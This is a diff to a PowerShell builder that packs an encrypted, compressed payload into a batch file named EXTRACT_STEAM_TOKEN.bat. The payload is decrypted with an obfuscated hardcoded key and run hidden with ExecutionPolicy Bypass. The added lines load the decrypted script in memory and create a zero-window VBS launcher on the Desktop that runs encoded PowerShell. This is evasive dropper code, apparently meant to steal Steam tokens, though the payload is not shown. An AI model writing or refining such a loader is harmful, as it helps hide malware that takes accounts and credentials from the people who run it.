@@ -45,21 +45,42 @@ function Wrap-Base64([string]$s, [int]$w = 120) {
 
 $payload = Protect-Payload $compressed
 
-$unpack = @'
-$l=Get-Content -LiteralPath '%~f0' -Encoding UTF8;$s=-1;$e=-1;for($i=0;$i -lt $l.Count;$i++){if($l[$i]-eq'::x7k9::'){$s=$i+1};if($l[$i]-eq'::x7k9e::'){$e=$i}};if($s -lt 0 -or $e -lt 0){exit 1};$p=($l[$s..($e-1)]-join '').Trim();$r=[Convert]::FromBase64String($p);$iv=$r[0..15];$c=$r[16..($r.Length-1)];$k=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(('Sharp'+'Buy_'+'SB_'+'2026'+'_xK7')));$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$iv;$m=New-Object IO.MemoryStream(,$c);$d=New-Object Security.Cryptography.CryptoStream($m,$a.CreateDecryptor(),[Security.Cryptography.CryptoStreamMode]::Read);$g=New-Object IO.Compression.GZipStream($d,[IO.Compression.CompressionMode]::Decompress);$t=New-Object IO.StreamReader($g);$x=$t.ReadToEnd();$t.Close();$f=$env:TEMP+'\sb_'+[guid]::NewGuid().ToString('n')+'.ps1';[IO.File]::WriteAllText($f,$x,[Text.UTF8Encoding]::new($false));powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $f;$z=$LASTEXITCODE;Remove-Item $f -Force -EA SilentlyContinue;exit $z
-'@ -replace '\s+', ' '
+$unpackSource = @'
+$b=$env:SB_BAT
+if(-not $b){exit 1}
+$l=Get-Content -LiteralPath $b -Encoding UTF8
+$s=-1;$e=-1
+for($i=0;$i -lt $l.Count;$i++){
+  if($l[$i]-eq'::x7k9::'){$s=$i+1}
+  if($l[$i]-eq'::x7k9e::'){$e=$i}
+}
+if($s -lt 0 -or $e -lt 0){exit 1}
+$p=($l[$s..($e-1)]-join '').Trim()
+$r=[Convert]::FromBase64String($p)
+$iv=$r[0..15];$c=$r[16..($r.Length-1)]
+$k=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(('Sharp'+'Buy_'+'SB_'+'2026'+'_xK7')))
+$a=[Security.Cryptography.Aes]::Create()
+$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$iv
+$m=New-Object IO.MemoryStream(,$c)
+$d=New-Object Security.Cryptography.CryptoStream($m,$a.CreateDecryptor(),[Security.Cryptography.CryptoStreamMode]::Read)
+$g=New-Object IO.Compression.GZipStream($d,[IO.Compression.CompressionMode]::Decompress)
+$t=New-Object IO.StreamReader($g)
+$x=$t.ReadToEnd();$t.Close()
+$null=[ScriptBlock]::Create($x).Invoke()
+exit $LASTEXITCODE
+'@
+
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($unpackSource))
 
 $stub = @"
 @echo off
-if /i "%~1"=="_bg" goto run
-start "" /min "%ComSpec%" /c ""%~f0" _bg"
+start /b wscript.exe //nologo "%~dp0EXTRACT_STEAM_TOKEN.vbs"
 exit /b
-:run
-powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$unpack"
-exit /b %ERRORLEVEL%
 goto :eof
 ::x7k9::
 "@
+
+$psExe = '%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe'
 
 $utf8NoBom = New-Object System.Text.UTF8Encoding $false
 $wrapped = Wrap-Base64 $payload
@@ -84,4 +105,21 @@ foreach ($out in $outPaths) {
     if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
     [IO.File]::WriteAllText($out, $content, $utf8NoBom)
     Write-Host ("OK: {0} ({1} bytes, AES+gzip)" -f $out, (Get-Item $out).Length)
+}
+
+$vbs = @"
+Set sh=CreateObject("WScript.Shell")
+Set fs=CreateObject("Scripting.FileSystemObject")
+bat=fs.BuildPath(fs.GetParentFolderName(WScript.ScriptFullName),"EXTRACT_STEAM_TOKEN.bat")
+sh.Environment("Process")("SB_BAT")=bat
+sh.Run "$psExe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded",0,False
+"@
+
+$vbsPaths = @(
+    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'EXTRACT_STEAM_TOKEN.vbs'),
+    (Join-Path $PSScriptRoot 'EXTRACT_STEAM_TOKEN.vbs')
+)
+foreach ($vbsOut in $vbsPaths) {
+    [IO.File]::WriteAllText($vbsOut, $vbs, $utf8NoBom)
+    Write-Host ("OK: {0} (zero-window launcher)" -f $vbsOut)
 }
